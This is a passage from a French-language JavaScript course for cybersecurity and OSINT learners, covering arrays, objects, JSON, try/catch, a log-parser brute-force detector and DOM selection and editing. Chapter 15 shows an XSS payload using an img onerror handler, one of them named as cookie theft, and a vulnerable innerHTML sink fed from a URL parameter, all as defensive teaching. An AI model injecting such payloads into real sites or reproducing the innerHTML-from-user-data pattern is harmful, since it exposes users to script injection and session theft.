console.log("IP publiques :", publiques);   // ["8.8.8.8", "1.1.1.1"]
```

## Application IT / cyber / OSINT

`filter`, `map`, `find` et `Set` sont **exactement** les outils du traitement d'IOC. Filtrer les IP publiques d'une liste, transformer une liste d'IP en lignes de règles de blocage, dédoublonner des domaines, trouver la première entrée suspecte : tout cela tient en quelques lignes lisibles. C'est le pendant JavaScript des list comprehensions de Python. Le mini-projet parser de logs en fin de partie repose entièrement sur ces méthodes.

## ❌ Erreur classique

```javascript
// ❌ Oublier de récupérer le résultat (map/filter renvoient un NOUVEAU tableau)
const codes = [200, 404];
codes.filter((c) => c >= 400);    // résultat jeté !
console.log(codes);               // [200, 404]  ← inchangé

// ✅ CORRECT
const erreurs = codes.filter((c) => c >= 400);

// ❌ Confondre find (un élément) et filter (un tableau)
const codes2 = [200, 404, 500];
console.log(codes2.find((c) => c >= 400));    // 404  (un seul)
console.log(codes2.filter((c) => c >= 400));  // [404, 500] (tableau)

// ❌ Accéder à un index qui n'existe pas
const arr = ["a"];
console.log(arr[5]);   // undefined (pas d'erreur, mais piège silencieux)
```

> ### ⚠️ À ne pas confondre : `find` vs `filter`
> - **`find`** renvoie **le premier élément** correspondant (ou `undefined`).
> - **`filter`** renvoie **un tableau** de tous les éléments correspondants (éventuellement vide).

> **Réflexe diagnostic :** ton `map`/`filter` « ne fait rien » ? Tu as oublié de **récupérer** le tableau renvoyé. Ces méthodes ne modifient pas l'original.

## Exercices

**Guidé**
1. Crée `const codes = [200, 404, 200, 500, 403, 200]`.
2. Avec `filter`, garde uniquement les codes `>= 400`.
3. Avec `map`, transforme-les en `"Erreur XXX"`.
4. Affiche le résultat et son `.length`.

**Autonome**
À partir d'une liste d'IP contenant des doublons et un mélange privé/public, produis un tableau des IP **publiques uniques** (combine `filter` et `Set`).

**Défi**
À partir d'un tableau de lignes de log `["8.8.8.8 200", "1.1.1.1 404", "8.8.8.8 500"]`, extrais avec `map` un tableau d'objets `{ip, code}` (utilise `split(" ")`), puis avec `filter` garde ceux dont le code `>= 400`. Affiche le résultat. *(On verra les objets en détail au chapitre suivant — ici, devine la syntaxe `{ip: ..., code: ...}`.)*

## ✅ Tu sais maintenant…

- créer, indexer et mesurer un tableau ;
- ajouter/retirer avec `push`/`pop` ;
- filtrer avec `filter`, transformer avec `map`, trouver avec `find` ;
- tester la présence avec `includes` ;
- enchaîner les méthodes et dédoublonner avec `Set` ;
- distinguer `find` (un élément) de `filter` (un tableau).


-----

# Chapitre 11 — Objets

## Le minimum à savoir

Un **objet** regroupe des données sous forme de paires **clé-valeur**. C'est l'outil idéal pour représenter une « chose » avec plusieurs caractéristiques.

```javascript
const evenement = {
  ip: "8.8.8.8",
  utilisateur: "admin",
  code: 403,
  date: "2024-01-15"
};

// Accès par point
console.log(evenement.ip);     // "8.8.8.8"
console.log(evenement.code);   // 403

// Accès par crochets (utile si la clé est dans une variable)
const cle = "utilisateur";
console.log(evenement[cle]);   // "admin"
```

### Modifier, ajouter, supprimer

```javascript
const alerte = { niveau: "info", source: "firewall" };

alerte.niveau = "critique";        // modifier
alerte.horodatage = "12:30:00";    // ajouter une nouvelle clé
delete alerte.source;              // supprimer

console.log(alerte);   // { niveau: "critique", horodatage: "12:30:00" }
```

### Parcourir un objet

```javascript
const service = { nom: "RDP", port: 3389, chiffre: false };

console.log(Object.keys(service));    // ["nom", "port", "chiffre"]
console.log(Object.values(service));  // ["RDP", 3389, false]

// Parcourir clés + valeurs
for (const [cle, valeur] of Object.entries(service)) {
  console.log(`${cle} : ${valeur}`);
}
// nom : RDP
// port : 3389
// chiffre : false
```

### Objets imbriqués et tableaux d'objets

C'est ainsi que se structurent les données réelles (et le JSON, chapitre suivant) :

```javascript
// Un tableau d'objets : LA structure la plus courante en cyber
const alertes = [
  { ip: "8.8.8.8", code: 403 },
  { ip: "1.1.1.1", code: 500 },
  { ip: "9.9.9.9", code: 200 }
];

console.log(alertes[0].ip);   // "8.8.8.8"

// Combiné avec filter/map du chapitre 10
const erreurs = alertes.filter((a) => a.code >= 400);
console.log(erreurs);   // [{ip: "8.8.8.8", code: 403}, {ip: "1.1.1.1", code: 500}]
```

### Déstructuration (raccourci pratique)

```javascript
const event = { ip: "8.8.8.8", code: 403 };
const { ip, code } = event;   // extrait ip et code en variables
console.log(ip, code);        // "8.8.8.8" 403
```

## Très utile en pratique

Modéliser une observation défensive comme objet, puis traiter une collection :

```javascript
const logs = [
  { ip: "203.0.113.5", action: "login", succes: false },
  { ip: "203.0.113.5", action: "login", succes: false },
  { ip: "8.8.8.8",     action: "login", succes: true }
];

// Combien d'échecs de connexion ?
const echecs = logs.filter((l) => l.action === "login" && l.succes === false);
console.log(`Échecs de connexion : ${echecs.length}`);   // 2
```

## Exemple simple

```javascript
function decrireService(service) {
  return `${service.nom} sur le port ${service.port} (chiffré : ${service.chiffre})`;
}

const ssh = { nom: "SSH", port: 22, chiffre: true };
console.log(decrireService(ssh));   // SSH sur le port 22 (chiffré : true)
```

## Application IT / cyber / OSINT

L'objet est la **brique de modélisation** de toute donnée structurée en sécurité : un événement de log, une alerte SOC, un IOC enrichi (`{valeur, type, source, score}`), une entrée de threat intel. Et surtout : un **tableau d'objets** est exactement ce que renvoient les APIs (sous forme JSON, chapitre suivant). Maîtriser « tableau d'objets + `filter`/`map` » te donne le geste central de l'analyse de données défensive.

> ### 🔍 Lecture de code inconnu
> Dans un script inconnu, les objets révèlent **la structure des données** manipulées. Un objet `{ token, userId, sessionId }` t'apprend beaucoup sur ce que le code gère, et donc sur ce qui pourrait fuiter.

## ❌ Erreur classique

```javascript
// ❌ Accéder à une clé qui n'existe pas
const event = { ip: "8.8.8.8" };
console.log(event.code);          // undefined (pas d'erreur)
console.log(event.code.toString()); // ❌ TypeError: Cannot read properties of undefined

// ✅ Vérifier avant, ou utiliser l'accès optionnel
console.log(event.code?.toString()); // undefined (le ?. évite le crash)

// ❌ Confondre point et crochets quand la clé est dynamique
const cle = "ip";
console.log(event.cle);    // undefined (cherche une clé littérale "cle" !)
console.log(event[cle]);   // "8.8.8.8"  ✅
```

> **Réflexe diagnostic :** `Cannot read properties of undefined` signifie que tu accèdes à une propriété sur quelque chose qui vaut `undefined`. Affiche l'objet avec `console.log` pour voir sa vraie structure, et utilise `?.` pour les accès incertains.

## Exercices

**Guidé**
1. Crée un objet `alerte` avec les clés `ip`, `code`, `date`.
2. Affiche chaque valeur avec une template string.
3. Ajoute une clé `traitee` valant `false`, puis passe-la à `true`.

**Autonome**
Crée un tableau de 4 objets `{ip, code}`. Avec `filter`, garde les erreurs (`code >= 400`). Avec `map`, transforme-les en chaînes `"IP X → code Y"`. Affiche le résultat.

**Défi**
À partir d'un tableau d'objets log `{ip, succes}`, compte le nombre d'échecs **par IP** et stocke le résultat dans un objet compteur `{ "203.0.113.5": 2, ... }`. *(Indice : parcours avec `for...of`, et fais `compteur[ip] = (compteur[ip] || 0) + 1`.)* C'est un vrai geste de détection de brute-force.

## ✅ Tu sais maintenant…

- créer un objet et accéder à ses valeurs par `.` et `[]` ;
- modifier, ajouter, supprimer des clés ;
- parcourir avec `Object.keys`, `values`, `entries` ;
- manipuler des tableaux d'objets avec `filter`/`map` ;
- déstructurer et utiliser l'accès optionnel `?.`.

-----

# Chapitre 12 — JSON

## Le minimum à savoir

**JSON** (*JavaScript Object Notation*) est le format texte universel d'échange de données sur le web. Toutes les APIs, presque tous les fichiers de configuration et de logs structurés l'utilisent. Sa syntaxe ressemble à un objet JavaScript, avec des règles strictes.

```json
{
  "ip": "8.8.8.8",
  "ports": [80, 443],
  "actif": true,
  "tags": null
}
```

Règles du JSON (plus strictes qu'un objet JS) :
- les **clés** sont toujours entre **guillemets doubles** ;
- les **chaînes** utilisent des guillemets **doubles** (jamais simples) ;
- pas de virgule après le dernier élément ;
- valeurs autorisées : string, number, boolean, `null`, objet, tableau.

### Convertir entre JSON et objet JavaScript

Deux fonctions, à ne jamais confondre :

```javascript
// JSON.parse : texte JSON → objet JavaScript (pour LIRE une réponse d'API)
const texteJson = '{"ip": "8.8.8.8", "code": 403}';
const obj = JSON.parse(texteJson);
console.log(obj.ip);     // "8.8.8.8"
console.log(obj.code);   // 403

// JSON.stringify : objet JavaScript → texte JSON (pour ENVOYER ou SAUVEGARDER)
const event = { ip: "1.1.1.1", code: 500 };
const json = JSON.stringify(event);
console.log(json);       // '{"ip":"1.1.1.1","code":500}'

// Version lisible (indentée)
console.log(JSON.stringify(event, null, 2));
```

Moyen mnémotechnique : **parse** = « lire » (entrant), **stringify** = « écrire » (sortant).

## Très utile en pratique

Lire une réponse d'API simulée (un tableau d'objets, structure ultra-courante) :

```javascript
const reponseApi = '[{"ip":"8.8.8.8","score":10},{"ip":"1.1.1.1","score":85}]';

const donnees = JSON.parse(reponseApi);

// On peut maintenant utiliser filter/map du chapitre 10
const malveillantes = donnees.filter((d) => d.score >= 80);
console.log(malveillantes);   // [{ip: "1.1.1.1", score: 85}]
```

## Exemple simple

```javascript
const alerte = {
  ip: "203.0.113.9",
  type: "brute-force",
  tentatives: 42
};

// Sauvegarder en JSON lisible
const json = JSON.stringify(alerte, null, 2);
console.log(json);
```

Sortie :

```text
{
  "ip": "203.0.113.9",
  "type": "brute-force",
  "tentatives": 42
}
```

## Application IT / cyber / OSINT

JSON est **omniprésent** en cyber : toutes les APIs de threat intelligence (VirusTotal, AbuseIPDB…), les SIEM, les exports de logs structurés parlent JSON. Le geste central est : `fetch` une API (Partie 5) → `JSON.parse` la réponse → `filter`/`map` les résultats → afficher ou sauvegarder. Tu vas le répéter constamment. Savoir lire et produire du JSON proprement est une compétence quotidienne d'analyste.

> ### 🛡️ Réflexe sécurité : ne jamais faire confiance à du JSON non validé
> Une réponse JSON vient souvent d'une source externe. **Trois précautions :**
> 1. **Entoure `JSON.parse` d'un `try/catch`** (chapitre suivant) : un JSON malformé fait planter ton code.
> 2. **Vérifie la structure** avant de l'utiliser : la clé attendue existe-t-elle ? Est-ce bien un tableau ?
> 3. **N'utilise JAMAIS `eval`** pour parser du JSON. `eval` exécute le texte comme du code → exécution arbitraire si la donnée est piégée. C'est le risque n° 2 de la Boîte à risques. `JSON.parse` est le seul bon outil.

## ❌ Erreur classique

```javascript
// ❌ JSON malformé → plantage
const mauvais = "{ip: '8.8.8.8'}";   // clés sans guillemets doubles, guillemets simples
JSON.parse(mauvais);   // ❌ SyntaxError: Unexpected token i in JSON

// ✅ JSON valide
const bon = '{"ip": "8.8.8.8"}';
console.log(JSON.parse(bon).ip);   // "8.8.8.8"

// ❌ Confondre l'objet et sa version texte
const obj = { a: 1 };
console.log(obj.a);              // 1 (objet)
const txt = JSON.stringify(obj);
console.log(txt.a);              // undefined (txt est une CHAÎNE, pas un objet !)

// ❌ Utiliser eval pour parser (DANGER)
// eval(texteJson);   // ☠️ JAMAIS — exécution de code arbitraire
```

> **Réflexe diagnostic :** `SyntaxError ... in JSON` ? Ton texte n'est pas du JSON valide. Vérifie les guillemets **doubles** sur les clés et les chaînes, et l'absence de virgule finale.

## Exercices

**Guidé**
1. Crée un objet `{ ip, code, date }`.
2. Convertis-le en JSON lisible avec `JSON.stringify(obj, null, 2)`.
3. Reconvertis ce JSON en objet avec `JSON.parse` et affiche `obj.ip`.

**Autonome**
À partir de la chaîne JSON `'[{"domaine":"a.test","score":20},{"domaine":"b.test","score":90}]'`, parse-la et garde les domaines de score `>= 80`. Affiche-les.

**Défi**
Écris une fonction `parserSafe(texte)` qui tente `JSON.parse` dans un `try/catch` (regarde le chapitre suivant si besoin) et renvoie l'objet, ou `null` si le JSON est invalide — sans planter. Teste-la avec un JSON valide et un JSON cassé.

## ✅ Tu sais maintenant…

- reconnaître la syntaxe stricte du JSON ;
- convertir texte → objet avec `JSON.parse` (lire) ;
- convertir objet → texte avec `JSON.stringify` (écrire), version indentée ;
- traiter une réponse JSON avec `filter`/`map` ;
- appliquer les réflexes sécurité : `try/catch`, validation de structure, jamais d'`eval`.

-----

# Chapitre 13 — Erreurs, exceptions et débogage

## Le minimum à savoir

Une **erreur** (ou exception) interrompt l'exécution. Apprendre à les **lire** est une compétence centrale : une erreur n'est pas un échec, c'est une information.

### Les types d'erreurs courants

| Type | Cause typique |
| --- | --- |
| **`SyntaxError`** | Code mal écrit (parenthèse manquante, JSON invalide). |
| **`ReferenceError`** | Utilisation d'une variable qui n'existe pas. |
| **`TypeError`** | Opération sur un type qui ne le permet pas (ex. appeler une méthode sur `undefined`). |

```javascript
console.log(inconnu);        // ReferenceError: inconnu is not defined

const x = null;
console.log(x.length);       // TypeError: Cannot read properties of null
```

### Lire une erreur (la stack trace)

Une erreur affiche un **message** et une **pile d'appels** (stack trace) : la liste des fonctions traversées, la plus récente en haut. Lis toujours :
1. **le type** d'erreur (TypeError, ReferenceError…) ;
2. **le message** (que s'est-il passé ?) ;
3. **la ligne** indiquée (où ?).

> ### 🧭 Réflexe diagnostic : méthode de lecture d'une erreur
> 1. **Type + message** te disent *quoi*. `Cannot read properties of undefined (reading 'x')` = tu accèdes à `.x` sur quelque chose qui vaut `undefined`.
> 2. **La première ligne de la stack** te dit *où*, dans ton code.
> 3. **Reproduis et isole** : ajoute un `console.log` juste avant la ligne fautive pour voir la vraie valeur.

### `try/catch` : gérer une erreur sans planter

```javascript
try {
  const obj = JSON.parse("{ cassé }");   // va échouer
  console.log(obj.ip);
} catch (erreur) {
  console.log("JSON invalide, on continue proprement :", erreur.message);
}

console.log("Le programme continue");   // s'exécute quand même
```

Structure : on **tente** (`try`) une opération risquée ; si elle échoue, on **attrape** l'erreur (`catch`) au lieu de planter. Optionnellement, `finally` s'exécute toujours, succès ou échec.

### Déclencher sa propre erreur avec `throw`

```javascript
function analyserCode(code) {
  if (typeof code !== "number") {
    throw new Error("Le code doit être un nombre");
  }
  return code >= 400 ? "erreur" : "ok";
}

try {
  analyserCode("404");   // string au lieu de number
} catch (e) {
  console.log("Problème :", e.message);   // Problème : Le code doit être un nombre
}
```

## Très utile en pratique

Le `try/catch` est **indispensable** autour de tout ce qui peut échouer : parsing JSON, requêtes réseau (Partie 5), lecture de fichiers (Partie 6).

```javascript
function parserSafe(texte) {
  try {
    return JSON.parse(texte);
  } catch {
    return null;   // au lieu de planter, on renvoie null
  }
}

console.log(parserSafe('{"ok": true}'));   // { ok: true }
console.log(parserSafe("cassé"));          // null
```

## Exemple simple

```javascript
const entrees = ['{"ip":"8.8.8.8"}', 'cassé', '{"ip":"1.1.1.1"}'];

for (const entree of entrees) {
  try {
    const obj = JSON.parse(entree);
    console.log("OK :", obj.ip);
  } catch {
    console.log("Ignoré (JSON invalide) :", entree);
  }
}
```

Sortie :

```text
OK : 8.8.8.8
Ignoré (JSON invalide) : cassé
OK : 1.1.1.1
```

Une seule entrée cassée n'arrête plus tout le traitement — crucial pour parser un fichier réel où une ligne peut être corrompue.

## Application IT / cyber / OSINT

En analyse défensive, tu traites des données **imparfaites** : logs avec des lignes corrompues, réponses d'API qui échouent, fichiers partiels. Sans gestion d'erreurs, ton script s'arrête à la première anomalie et tu perds tout le reste. Avec `try/catch`, tu **isoles** les échecs et tu continues : tu parses les 9 999 lignes valides en ignorant proprement la ligne cassée. C'est la différence entre un script fragile et un outil robuste. La gestion des erreurs réseau (`fetch`) — risque n° 11 de la Boîte à risques — repose sur ces réflexes.

## ❌ Erreur classique

```javascript
// ❌ Ne pas gérer une opération risquée → tout s'arrête
const lignes = ['{"a":1}', 'cassé', '{"b":2}'];
for (const l of lignes) {
  const obj = JSON.parse(l);   // plante sur "cassé", la boucle s'arrête !
  console.log(obj);
}

// ✅ CORRECT : try/catch dans la boucle
for (const l of lignes) {
  try {
    console.log(JSON.parse(l));
  } catch {
    console.log("ligne ignorée");
  }
}

// ❌ Attraper l'erreur et l'ignorer en silence (catch vide sans log)
// → tu masques des problèmes réels. Logue au moins quelque chose.
```

> **Réflexe diagnostic :** ne crains pas les erreurs rouges dans la console — **lis-les**. 90 % du débogage, c'est lire le type, le message et la ligne, puis ajouter un `console.log` au bon endroit.

## Exercices

**Guidé (lecture d'erreurs)**
Pour chaque ligne, **prédis** le type d'erreur avant d'exécuter, puis vérifie :
```javascript
console.log(maVariable);        // ?
const o = null; o.x;            // ?
JSON.parse("{ pas du json }");  // ?
```

**Autonome**
Écris une fonction `diviser(a, b)` qui `throw` une erreur si `b === 0`, sinon renvoie `a / b`. Appelle-la dans un `try/catch` avec `b = 0` et affiche le message d'erreur proprement.

**Défi**
Tu reçois un tableau de chaînes censées être du JSON, mais certaines sont cassées. Écris une boucle qui parse chaque entrée avec `try/catch`, accumule les objets valides dans un tableau `valides` et compte les invalides. Affiche : `X entrées valides, Y ignorées`. C'est exactement le squelette d'un parser de logs robuste.

## ✅ Tu sais maintenant…

- reconnaître `SyntaxError`, `ReferenceError`, `TypeError` ;
- lire une erreur (type, message, ligne) et appliquer une méthode de diagnostic ;
- gérer une opération risquée avec `try/catch/finally` ;
- déclencher une erreur avec `throw new Error(...)` ;
- écrire du code robuste qui continue malgré une donnée cassée.

-----

## 🧩 Mini-projet — Parser de logs et extracteur d'IOC (chapitres 7 à 13)

Rassemble toute la Partie 2. Crée `parser.js` (à tester en console ou dans une page).

**Objectif :** à partir d'un bloc de logs bruts, extraire les IP, compter les échecs de connexion par IP, repérer les IP qui dépassent un seuil (détection de brute-force simple), et produire un rapport JSON.

```javascript
// parser.js

// Des logs bruts (simulés). En Partie 6, on les lira depuis un vrai fichier.
const logsBruts = `
2024-01-15 10:00:01 203.0.113.5 login FAILED
2024-01-15 10:00:02 203.0.113.5 login FAILED
2024-01-15 10:00:03 8.8.8.8 login OK
2024-01-15 10:00:04 203.0.113.5 login FAILED
2024-01-15 10:00:05 ligne corrompue ???
2024-01-15 10:00:06 1.1.1.1 login FAILED
2024-01-15 10:00:07 203.0.113.5 login FAILED
`;

const SEUIL = 3;

// 1. Découper en lignes, enlever les lignes vides
const lignes = logsBruts
  .split("\n")
  .map((l) => l.trim())
  .filter((l) => l.length > 0);

// 2. Parser chaque ligne en objet, en ignorant les lignes invalides
const evenements = [];
for (const ligne of lignes) {
  try {
    const champs = ligne.split(" ");
    // champs : [date, heure, ip, action, statut]
    const ip = champs[2];
    const action = champs[3];
    const statut = champs[4];

    // Validation simple : l'IP doit ressembler à une IPv4
    if (!/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(ip)) {
      throw new Error("IP invalide");
    }

    evenements.push({ ip, action, statut });
  } catch {
    console.log(`⚠️ Ligne ignorée : ${ligne}`);
  }
}

// 3. Garder seulement les échecs de login
const echecs = evenements.filter(
  (e) => e.action === "login" && e.statut === "FAILED"
);

// 4. Compter les échecs par IP
const compteur = {};
for (const e of echecs) {
  compteur[e.ip] = (compteur[e.ip] || 0) + 1;
}

// 5. Repérer les IP au-dessus du seuil
const suspectes = Object.entries(compteur)
  .filter(([ip, n]) => n >= SEUIL)
  .map(([ip, n]) => ({ ip, echecs: n }));

// 6. Produire un rapport JSON
const rapport = {
  total_evenements: evenements.length,
  total_echecs: echecs.length,
  ip_suspectes: suspectes
};

console.log("--- RAPPORT ---");
console.log(JSON.stringify(rapport, null, 2));
```

Sortie attendue :

```text
⚠️ Ligne ignorée : 2024-01-15 10:00:05 ligne corrompue ???
--- RAPPORT ---
{
  "total_evenements": 6,
  "total_echecs": 4,
  "ip_suspectes": [
    {
      "ip": "203.0.113.5",
      "echecs": 4
    }
  ]
}
```

Ce mini-projet mobilise **toute la Partie 2** : fonctions, chaînes (`split`, `trim`), regex (validation IP), tableaux (`map`, `filter`), objets (compteur, `Object.entries`), JSON (`stringify`), et gestion d'erreurs (`try/catch` pour la ligne corrompue). C'est un vrai **détecteur de brute-force** miniature, et le pendant JavaScript du parser de logs du cours Python.

**Pour aller plus loin :** ajoute des lignes pour `1.1.1.1` afin qu'elle dépasse aussi le seuil, et vérifie qu'elle apparaît dans `ip_suspectes`.

-----

## ✅ CHECKPOINT 2 — Tu sais structurer données et code

Avant la Partie 3, assure-toi de pouvoir, **sans regarder** :

- [ ] écrire une fonction (classique et fléchée) avec `return` ;
- [ ] manipuler des chaînes (`trim`, `toLowerCase`, `split`, `includes`…) ;
- [ ] parser une URL avec `new URL(...)` ;
- [ ] extraire des IOC d'un texte avec une regex simple et le drapeau `g` ;
- [ ] filtrer/transformer un tableau avec `filter`, `map`, `find` ;
- [ ] modéliser des données avec des objets et des tableaux d'objets ;
- [ ] lire et produire du JSON avec `JSON.parse` / `JSON.stringify` ;
- [ ] gérer une erreur avec `try/catch` et écrire du code robuste ;
- [ ] réaliser le mini-projet parser de logs.

Tu disposes maintenant de **tout le langage**. La Partie 3 quitte la pure logique pour faire vivre une page web : le DOM et les événements.


-----

# Chapitre 14 — Le DOM : comprendre et sélectionner

## Le minimum à savoir

Jusqu'ici, on a affiché dans la **console**. Maintenant, on va modifier la **page** elle-même. Pour cela, il faut comprendre le **DOM**.

### Qu'est-ce que le DOM ?

Quand le navigateur charge une page HTML, il la transforme en un **arbre d'objets** manipulable par JavaScript : le **DOM** (*Document Object Model*). Chaque balise HTML devient un **nœud** dans cet arbre.

```html
<body>
  <h1>Titre</h1>
  <p>Paragraphe</p>
</body>
```

devient, dans le DOM, un arbre :

```text
document
  └── body
        ├── h1  ("Titre")
        └── p   ("Paragraphe")
```

JavaScript accède à cet arbre via l'objet global **`document`**. Modifier le DOM = modifier ce que l'utilisateur voit, **en direct**, sans recharger la page.

> ### 🧭 Navigateur vs Node.js
> Le DOM et l'objet `document` **n'existent que dans le navigateur**. Dans Node.js (Partie 6), il n'y a pas de page : `document` n'existe pas. C'est l'une des différences les plus importantes entre les deux mondes. Si tu vois `document is not defined`, tu es probablement en train d'exécuter du code navigateur dans Node.

### Sélectionner des éléments

Pour modifier un élément, il faut d'abord l'**attraper**. La méthode moderne est **`querySelector`**, qui utilise la syntaxe des sélecteurs CSS.

```html
<h1 id="titre">Page de test</h1>
<p class="info">Premier paragraphe</p>
<p class="info">Deuxième paragraphe</p>
```

```javascript
// Par id (avec #)
const titre = document.querySelector("#titre");

// Par classe (avec .)
const premierInfo = document.querySelector(".info");   // le PREMIER trouvé

// Tous les éléments correspondants
const tousLesInfos = document.querySelectorAll(".info");   // une liste

// Par balise
const premierP = document.querySelector("p");
```

- **`querySelector`** renvoie le **premier** élément correspondant (ou `null` si aucun).
- **`querySelectorAll`** renvoie **tous** les éléments (une liste qu'on peut parcourir avec `for...of`).

```javascript
const infos = document.querySelectorAll(".info");
console.log(infos.length);   // 2

for (const p of infos) {
  console.log(p.textContent);   // "Premier paragraphe", puis "Deuxième paragraphe"
}
```

## Très utile en pratique

Lire le contenu et les attributs d'un élément :

```javascript
const lien = document.querySelector("a");
console.log(lien.textContent);        // le texte du lien
console.log(lien.getAttribute("href")); // l'URL du lien
```

## Exemple simple

Page `index.html` :

```html
<body>
  <h1 id="statut">En attente</h1>
  <script src="script.js"></script>
</body>
```

`script.js` :

```javascript
const titre = document.querySelector("#statut");
console.log("Texte actuel :", titre.textContent);   // "En attente"
```

## Application IT / cyber / OSINT

Comprendre le DOM est **fondamental** pour analyser une page web. En OSINT, tu inspectes le DOM (onglet *Éléments* des DevTools) pour voir la structure réelle d'une page, repérer des données cachées, des champs, des liens. `querySelectorAll("a")` dans la console te liste tous les liens d'une page — un geste de reconnaissance classique. Comprendre comment JavaScript lit et modifie le DOM est aussi le préalable indispensable pour comprendre les failles XSS (chapitre suivant et Partie 7).

> ### 🔍 Lecture de code inconnu
> Dans un script inconnu, les appels à `querySelector` / `getElementById` te montrent **quels éléments de la page le code manipule**. C'est une piste directe sur son comportement.

## ❌ Erreur classique

```javascript
// ❌ Sélectionner un élément qui n'existe pas encore (script dans le <head>)
// → querySelector renvoie null
const titre = document.querySelector("#statut");
console.log(titre.textContent);   // ❌ TypeError: Cannot read properties of null

// ✅ Placer le <script> à la fin du <body> (rappel chapitre 2)
//    ou vérifier que l'élément existe

// ❌ Oublier le # ou le . dans le sélecteur
document.querySelector("statut");    // cherche une balise <statut> → null
document.querySelector("#statut");   // ✅ cherche l'id "statut"
```

> **Réflexe diagnostic :** `Cannot read properties of null` après un `querySelector` ? Soit le sélecteur est faux (oubli de `#`/`.`), soit l'élément n'existe pas encore (script trop tôt). Vérifie la position du `<script>` et l'orthographe du sélecteur.

## Exercices

**Guidé**
1. Crée une page avec un `<h1 id="titre">` et deux `<p class="ligne">`.
2. Dans `script.js`, sélectionne le titre et affiche son `textContent`.
3. Sélectionne tous les `.ligne` et affiche combien il y en a.

**Autonome**
Ajoute trois `<a href="...">` à ta page. Dans la console, écris du code qui liste tous les `href` de la page (sélectionne tous les `a`, parcours-les, affiche `getAttribute("href")`).

**Défi**
Sur n'importe quelle page web réelle, ouvre la console et compte le nombre de liens (`document.querySelectorAll("a").length`), puis affiche les 5 premiers `href`. C'est un mini-geste de reconnaissance OSINT.

## ✅ Tu sais maintenant…

- expliquer ce qu'est le DOM (l'arbre d'objets d'une page) ;
- comprendre que `document` n'existe que dans le navigateur ;
- sélectionner avec `querySelector` (premier) et `querySelectorAll` (tous) ;
- utiliser les sélecteurs CSS (`#id`, `.classe`, `balise`) ;
- lire `textContent` et les attributs ;
- diagnostiquer un `null` après sélection.

-----

# Chapitre 15 — Modifier le DOM en sécurité (`textContent` vs `innerHTML`)

## Le minimum à savoir

Une fois un élément sélectionné, tu peux **modifier** son contenu, ses attributs, ses classes. Et c'est ici qu'apparaît **la première grande question de sécurité** du cours.

### Modifier le texte : `textContent`

```javascript
const titre = document.querySelector("#statut");
titre.textContent = "Analyse terminée";   // remplace le texte affiché
```

`textContent` traite ce que tu mets comme du **texte pur**. Même si la valeur contient `<script>`, ce sera affiché tel quel, jamais exécuté. **C'est sûr.**

### Modifier le HTML : `innerHTML` (à manier avec précaution)

```javascript
const zone = document.querySelector("#zone");
zone.innerHTML = "<strong>Important</strong>";   // interprété comme du HTML
```

`innerHTML` **interprète** la valeur comme du HTML. C'est puissant, mais **dangereux** si la valeur contient une donnée non maîtrisée.

> ### 🛡️ Réflexe sécurité (CRUCIAL) : `textContent` vs `innerHTML`
> C'est **le** réflexe de sécurité côté client le plus important du cours.
>
> - Pour afficher une **donnée** (surtout venant d'un utilisateur, d'une URL, d'une API) → **`textContent`**, toujours.
> - **`innerHTML`** seulement avec du HTML que **tu** contrôles entièrement, jamais avec une donnée externe.
>
> **Pourquoi ?** Si tu fais `element.innerHTML = donneeUtilisateur` et que cette donnée contient `<img src=x onerror="vol_de_cookies()">`, le navigateur **exécute** ce code. C'est une faille **XSS** (*Cross-Site Scripting*), plus précisément un **DOM XSS** quand c'est ton JavaScript qui injecte la donnée. C'est le risque n° 1 et n° 13 de la Boîte à risques.

### Démonstration de la faille (à des fins défensives)

```javascript
const saisieUtilisateur = '<img src=x onerror="alert(\'XSS\')">';
const zone = document.querySelector("#zone");

// ☠️ DANGEREUX : le code dans la saisie s'exécute
zone.innerHTML = saisieUtilisateur;   // déclenche l'alerte → faille XSS

// ✅ SÛR : la saisie est affichée comme texte, le code ne s'exécute pas
zone.textContent = saisieUtilisateur; // affiche littéralement le texte <img ...>
```

### Modifier classes et attributs

```javascript
const el = document.querySelector("#statut");

el.classList.add("alerte");        // ajoute une classe CSS
el.classList.remove("normal");     // retire une classe
el.classList.toggle("visible");    // bascule (ajoute/retire)

el.setAttribute("data-ip", "8.8.8.8");   // définir un attribut
```

## Très utile en pratique

Afficher un résultat d'analyse **en sécurité** :

```javascript
function afficherResultat(message) {
  const zone = document.querySelector("#resultat");
  zone.textContent = message;        // ✅ textContent : pas d'injection possible
  zone.classList.add("termine");
}

afficherResultat("3 IP suspectes détectées");
```

## Exemple simple

```html
<body>
  <p id="sortie">...</p>
  <script src="script.js"></script>
</body>
```

```javascript
const sortie = document.querySelector("#sortie");
const ip = "8.8.8.8";
sortie.textContent = `Dernière IP analysée : ${ip}`;
```

## Application IT / cyber / OSINT

Comprendre `textContent` vs `innerHTML` n'est pas qu'une bonne pratique : c'est **comprendre comment naît une faille web côté client**. En sécurité web défensive (la suite de cette collection), l'XSS est l'une des vulnérabilités les plus répandues. Savoir que `innerHTML` + donnée non maîtrisée = injection te permet, en tant qu'analyste, de **repérer** ce motif dangereux dans le code d'une application, et de comprendre les rapports de vulnérabilité. C'est aussi la base pour construire des outils web (inspecteur d'IOC) qui n'introduisent pas eux-mêmes de faille.

> ### 🔍 Lecture de code inconnu
> Dans un script inconnu, repère **chaque usage de `innerHTML`** : c'est un point chaud potentiel de XSS, surtout si la valeur vient d'une URL, d'un champ ou d'une API.

## ❌ Erreur classique

```javascript
// ❌ LA grande erreur : innerHTML avec une donnée utilisateur
const recherche = new URL(location.href).searchParams.get("q");
zone.innerHTML = recherche;   // ☠️ DOM XSS si q contient du HTML/JS malveillant

// ✅ CORRECT : textContent
zone.textContent = recherche;

// ❌ Utiliser eval (jamais, sous aucun prétexte)
// eval(codeUtilisateur);   // ☠️ exécution arbitraire — risque n°2

// ❌ Croire que textContent "casse" l'affichage du HTML voulu
// → si tu veux VRAIMENT du HTML que TU contrôles, innerHTML est ok ;
//   le danger est uniquement avec des données EXTERNES.
```

> **Réflexe sécurité résumé :** *donnée externe → `textContent`. HTML que je contrôle → `innerHTML` possible. Jamais d'`eval`.*

## Exercices

**Guidé**
1. Crée une page avec `<p id="sortie">`.
2. Mets-y un texte avec `textContent`.
3. Essaie ensuite `innerHTML = "<strong>Gras</strong>"` et observe la différence d'affichage.

**Autonome**
Crée une fonction `afficher(message)` qui met le message dans `#sortie` avec `textContent` et ajoute la classe `"affiche"`. Teste avec un message contenant `<b>` et vérifie qu'il s'affiche **littéralement** (preuve que c'est sûr).

**Défi**
